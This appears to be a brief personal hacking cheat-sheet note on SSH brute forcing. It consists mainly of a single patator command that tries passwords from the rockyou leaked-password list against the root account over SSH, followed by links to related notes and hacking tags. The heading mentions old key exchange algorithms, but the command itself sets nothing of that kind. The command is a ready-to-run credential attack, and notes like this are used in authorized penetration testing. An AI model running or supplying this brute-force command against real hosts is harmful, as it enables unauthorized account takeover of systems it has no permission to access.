# SSH brute force old key exchange algorithms
```bash
patator ssh_login host=$IP port=22 user=root 0=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt password=FILE0 -x ignore:mesg='Authentication failed'
```

# Related

- [20221003150346](/zet/20221003150346/README.md) SSH brute force
- ~/kb/hacking/misc/bruteforcing-tools.md

Tags:

    #hacking #bruteforcing 
